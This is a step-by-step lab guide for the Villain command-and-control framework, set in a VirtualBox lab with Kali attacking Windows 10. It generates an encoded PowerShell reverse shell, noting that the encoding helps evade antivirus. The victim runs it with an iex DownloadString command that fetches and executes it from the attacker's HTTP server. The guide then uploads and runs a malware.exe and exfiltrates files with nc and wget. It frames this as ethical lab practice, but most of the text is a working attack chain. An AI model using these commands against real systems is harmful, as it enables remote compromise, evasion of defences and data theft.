# Simple Villain Framework Lab Guide

A step-by-step lab using **Kali Linux** (attacker) and **Windows 10** (victim) in VirtualBox, from payload gen to file transfers.

---

## 1. VirtualBox VM & Networking Setup

1. **Create VMs** in VirtualBox:

   * **Kali Linux**
   * **Windows 10**
2. **Set both adapters** to an **Internal Network** (or Host-Only) named `LabNet`.
3. **Assign static IPs** on the same `/24` subnet:

   * **Kali** (terminal):

     ```bash
     sudo ip addr add 192.168.56.10/24 dev eth0
     sudo ip link set eth0 up
     ```
   * **Windows 10** (Control Panel → Network Adapter → IPv4 settings):

     ```text
     IP address:    192.168.56.20
     Subnet mask:   255.255.255.0
     Gateway/DNS:   (leave blank)
     ```
4. **Verify connectivity**:

   ```bash
   # On Kali
   ping 192.168.56.20
   ```

   You should see replies.

---

## 2. Prepare Kali Attacker

1. **Update & upgrade**:

   ```bash
   sudo apt update && sudo apt upgrade -y
   ```
2. **Clone Villain**:

   ```bash
   git clone https://github.com/keralahacker/Villain.git
   cd Villain
   ```

   > If GitHub is blocked (e.g. college Wi‑Fi), use a VPN or your phone’s hotspot.
3. **Install Python deps**:

   ```bash
   pip install -r requirements.txt
   ```
   ```bash
   sudo pip install -r requirements.txt --break-system-packages
   ```
   If it fails, skip to next step.
4. **Start Villain**:

   ```bash
   python3 Villain.py
   ```

   You’ll see the `villain>` prompt.

---

## 3. Build & Deliver Your Payload

### 3.1 Generate the reverse shell

```
villain> generate payload=<OS/handler/template> lhost=<YOUR_IP_or_interface> [encode|obfuscate]
```

| Element       | Meaning                      | Example                   |
| ------------- | ---------------------------- | ------------------------- |
| `OS`          | Target OS family             | `windows`                 |
| `handler`     | Connection type              | `reverse_tcp` (stable)    |
| `template`    | Payload script               | `powershell`              |
| `lhost`       | Your Kali IP or interface    | `192.168.56.10` or `eth0` |
| `[encode]`    | Simple Base64-style encoding | optional (helps evade AV) |
| `[obfuscate]` | String-twisting for stealth  | optional                  |

**Example:**

```bash
villain> generate payload=windows/reverse_tcp/powershell lhost=192.168.56.10 encode
```

This writes `payload.ps1` for the Windows VM.

### 3.2 Host & run the payload

1. **On Kali**, serve it over HTTP:

   ```bash
   cp Core/payloads/windows/reverse_tcp/powershell.ps1 ~/payload.ps1
   cd ~
   python3 -m http.server 8000
   ```
2. **On Windows 10** (PowerShell as Admin):

   ```powershell
   iex (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8000/payload.ps1')
   ```

   This runs the reverse shell back to Kali.

---

## 4. Catch & Use Your Shell

1. **List sessions**:

   ```bash
   villain> sessions
   ```
2. **Enter the shell**:

   ```bash
   villain> shell <SESSION_ID>
   ```

   You get a `PS C:\>` prompt. Use `exit` or Ctrl+C to return.

---

## 5. Uploading Files to the Victim

```
villain> upload <local_path_on_kali> <remote_path_on_windows>
```

* **Example:**

  ```bash
  villain> upload /home/kali/tools/malware.exe C:\Users\Public\malware.exe
  ```
* Then inside your shell:

  ```powershell
  PS C:\> & 'C:\Users\Public\malware.exe'
  ```

---

## 6. Downloading Files from the Victim

Villain has no built-in “download,” but you can exfiltrate:

1. **On Kali**, listen:

   ```bash
   nc -lvp 9001 > secret.txt
   ```
2. **In Windows shell:**

   ```powershell
   PS C:\> nc 192.168.56.10 9001 < C:\Users\Public\secret.txt
   ```

Alternatively, spin up an HTTP server on Windows:

```powershell
PS C:\Users\Public> python3 -m http.server 8000
```

Then on Kali:

```bash
wget http://192.168.56.20:8000/secret.txt -O secret.txt
```

---

## 7. Cleaning Up & Tips

* **flee**: Exit without killing sessions:

  ```bash
  villain> flee
  ```
* **purge**: Wipe saved implant metadata:

  ```bash
  villain> purge
  ```

**Pro Tips:**

* Verify your **lhost** and subnet before generating.
* Use `backdoors` to list re-usable payloads.
* Keep Kali’s firewall off on the lab network.

---

## 8. Broadcast Messages with `#`

You can send a chat message to all connected sibling servers by prefixing with `#`:

```bash
villain> # Hey team, switch to backup C2 channel
```

---

That’s the full lab: network setup, payload gen, shell, file IO, and messaging. Enjoy your ethical testing!
